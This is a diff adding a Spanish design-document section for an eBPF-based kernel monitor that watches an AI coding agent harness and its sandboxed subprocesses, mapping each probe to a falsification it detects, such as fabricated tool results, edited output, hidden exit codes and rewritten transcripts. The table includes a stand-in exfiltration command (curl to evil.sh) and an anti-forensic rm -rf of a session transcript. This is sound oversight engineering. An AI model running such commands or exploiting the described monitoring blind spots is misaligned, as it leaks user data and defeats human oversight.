@@ -59,6 +59,34 @@ flowchart LR
 
 Lectura: **ninguna flecha de userspace llega a ningún lado sin cruzar un probe del kernel.** La única TLS que el harness no ve es la de su propio hijo (⑤) — y el kernel la ve igual.
 
+## Puntos de telemetría — flujo api→tls y responsable
+
+La clave de esta tabla: **solo hay una TLS legítima en el sistema — la del harness contra la API** (el sandbox nunca habla con el modelo). La única fila donde aparece una TLS de otro responsable es la ⑤, y justo por eso es la fila de exfiltración. Ejemplos con Claude Code (pi.dev es análogo: mismo Node, mismos hijos).
+
+| # | Probe eBPF | Qué captura | Ejemplo del flujo (api→tls) | Resp. de la TLS | Mentira que cierra | Prio |
+|---|---|---|---|---|---|---|
+| 1 | `sys_enter_execve` | Comando real + argv | API responde `tool_use {cmd:"pnpm test"}` → viaja por la TLS del harness → harness hace `fork/exec("/bin/bash","-lc","pnpm test")` | **Harness** (la orden nació en su TLS con la API; el execve lo dispara él como parent) | Harness sustituye el comando; modelo inventa acciones | **P0** |
+| 2 | `sys_enter_exit_group` | Exit code real | El hijo termina → `exit_group(1)` — local, cero TLS; ese 1 *debería* viajar luego como tool_result por la TLS del harness | **Harness** (es quien debe reportarlo al API) | "Todo pasó" con exit 1 | **P0** |
+| 3 | `sys_enter_write` fd 1/2 | stdout/stderr real | `bash` escribe `FAIL src/app.spec.ts` al pipe (fd 1) → harness lo lee → lo manda como `tool_result` en `POST /v1/messages` (TLS) | **Harness** (dueño de la TLS donde ese contenido debería aparecer íntegro) | Harness edita/trunca/fabrica la salida | **P0** |
+| 4 | uprobe `SSL_write` | Plaintext del request | `POST https://api.anthropic.com/v1/messages` — body con **todo** el historial: messages + tool_results. Capturado en plaintext antes de cifrar | **Harness** — es su socket, su TLS | Lado "claims": lo que el harness le cuenta al modelo que pasó | **P0** |
+| 5 | `sys_enter_connect` / `kprobe:tcp_connect` | Destino IP:puerto | (a) harness conecta a `api.anthropic.com:443` — legítima; (b) el hijo ejecuta `curl https://evil.sh/dump` y conecta a `45.x.x.x:443` — **esta TLS el harness jamás la ve** | (a) **Harness**; (b) **Sandbox/hijo** — la única fila con TLS de otro responsable | Exfiltración por omisión; reemplaza el Egress Gateway | P1 |
+| 6 | `sys_enter_openat` / `sys_enter_unlinkat` | Archivos tocados/borrados | El hijo ejecuta `rm -rf ~/.claude/projects/sesión.jsonl` — local, sin TLS; actor: hijo (anti-forense) o harness | — (no hay TLS; acción pura del filesystem) | El rogue borra sus rastros | P1 |
+| 7 | uprobe `SSL_read` | Respuesta original del modelo | `200 OK` + SSE `event: content_block_delta` con el `tool_use` **original** del modelo, llegando por el socket del harness | **Harness** (su socket) — contenido originado por el proveedor | Harness edita lo que el modelo dijo antes de ejecutarlo | P2 |
+| 8 | `write` a paths del transcript | El transcript al escribirse | Harness escribe `~/.claude/projects/.../abc123.jsonl` — su versión oficial de la historia, en disco, sin TLS | — (local; actor: harness) | Harness reescribe su historia después | P2 |
+
+Lectura de la columna responsable:
+
+```text
+TLS legítima (única):  API del modelo ←—— TLS #1 ——→ HARNESS      ← responsable: harness, siempre
+TLS sospechosa:        HIJO/SANDBOX —— TLS #2 ——→ cualquier lado ← responsable: sandbox (fila 5b)
+```
+
+- **Filas 1, 2, 3, 4, 7:** todo el contenido en juego nace o muere en la TLS #1 (harness↔API). El responsable de que sea fiel es el harness — sus diffs detectan mentiras **del harness o del modelo**, nunca del sandbox.
+- **Fila 5:** la única con TLS del sandbox. Esa TLS es invisible para el harness (no pasa por él) y solo el kernel la ve — es exactamente el canal de exfiltración que un Egress Gateway dentro del harness se pierde. Por eso el probe va en el kernel y filtra por cgroup.
+- **Filas 6 y 8:** sin TLS — son las filas de anti-forense local (qué archivos tocó/borró el hijo, qué escribió el harness en su propio diario).
+
+Traducción para el pitch: **el harness responde por todo lo que cruza la TLS #1; el sandbox responde por cada connect que no sea hacia la API; y el kernel es el único testigo presente en ambas fronteras.**
+
 ## Módulos — todo a construir, en este orden
 
 ### 1. `capture` — ingesta de la captura kernel
